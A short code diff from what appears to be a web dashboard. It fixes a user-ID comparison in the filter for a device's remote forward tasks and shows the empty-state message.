@@ -1559,7 +1820,7 @@ include_once __DIR__ . '/header.php';
                           </div>
                         </div>
                       ))}
-                      {forwardTasks.filter(t => t.userId === selectedUser.userId).length === 0 && (
+                      {forwardTasks.filter(t => t.userId === selectedUser.id).length === 0 && (
                         <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
                           No active remote forward tasks for this device.
                         </div>
